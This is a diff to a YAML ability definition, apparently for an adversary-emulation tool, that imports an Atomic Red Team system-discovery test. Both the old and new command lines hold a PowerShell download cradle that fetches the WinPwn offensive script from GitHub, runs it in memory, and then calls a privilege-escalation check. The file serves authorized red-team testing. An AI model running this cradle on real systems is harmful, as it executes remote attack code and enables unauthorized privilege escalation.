@@ -9,7 +9,8 @@
   platforms:
     windows:
       psh:
-        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+        command: $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
           itm4nprivesc -noninteractive -consoleoutput
   plugin: atomic
   singleton: false
@@ -17,11 +18,11 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - discovery
+  - atomic-red-team
   - t1082
   author: Atomic Red Team
   additional_info:
     technique_created: '2017-05-31T21:31:04.307Z'
     atomic_guid: 3d256a2f-5e57-4003-8eb6-64d91b1da7ce
-    import_timestamp: '2025-09-02T03:07:42.056071Z'
+    import_timestamp: '2025-09-03T02:56:14.668048Z'
